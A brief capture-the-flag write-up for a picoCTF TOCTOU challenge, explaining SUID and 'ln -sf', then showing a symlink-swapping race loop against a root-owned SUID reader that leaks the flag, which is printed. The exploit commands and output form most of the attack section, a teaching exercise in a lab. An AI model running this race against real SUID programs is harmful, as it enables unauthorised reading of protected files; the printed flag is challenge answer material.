# Lesson
- practicing `TOCTOU` exploitation  
- `ln -sf`  
  - -s: Create a symbolic link.  
  - -f: If the target file or directory already exists, remove it and create the link.  
- `SUID`
  a kind of permission type

# Memo
1. analyze  
"txtreader" is owned by "root" and has the SUID bit set, so it runs with "root" privileges even when launched by the low-privilege "ctf-player" account.
```zsh
ctf-player@pico-chall$ whoami
ctf-player
ctf-player@pico-chall$
ctf-player@pico-chall$ ls -la
total 32
drwxr-xr-x 1 ctf-player ctf-player    20 Jan  6 14:06 .
drwxr-xr-x 1 root       root          24 Aug  4 21:50 ..
drwx------ 2 ctf-player ctf-player    34 Jan  6 14:06 .cache
-rw-r--r-- 1 root       root          67 Aug  4 21:52 .profile
-rw------- 1 root       root          32 Aug  4 21:52 flag.txt
-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16  2023 src.cpp
-rwsr-xr-x 1 root       root       19016 Aug  4 21:52 txtreader
```

2. exploit
```zsh
ctf-player@pico-chall$ touch dummy
ctf-player@pico-chall$ 
ctf-player@pico-chall$ for i in {1..10000}; do ln -sf dummy flag; ln -sf flag.txt flag; done &
[1] 37
ctf-player@pico-chall$ for i in {1..10000}; do ./txtreader flag 2>/dev/null; done
picoCTF{ToctoU_!s_3a5y_0490d70a}
picoCTF{ToctoU_!s_3a5y_0490d70a}
picoCTF{ToctoU_!s_3a5y_0490d70a}
picoCTF{ToctoU_!s_3a5y_0490d70a}
```

# Ref
- https://samsclass.info/127/proj/E10.htm  
- https://brandon-t-elliott.github.io/tic-tac  
- https://medium.com/@khanzjoel55/pico-ctf-2023-writeups-a09828def8cc  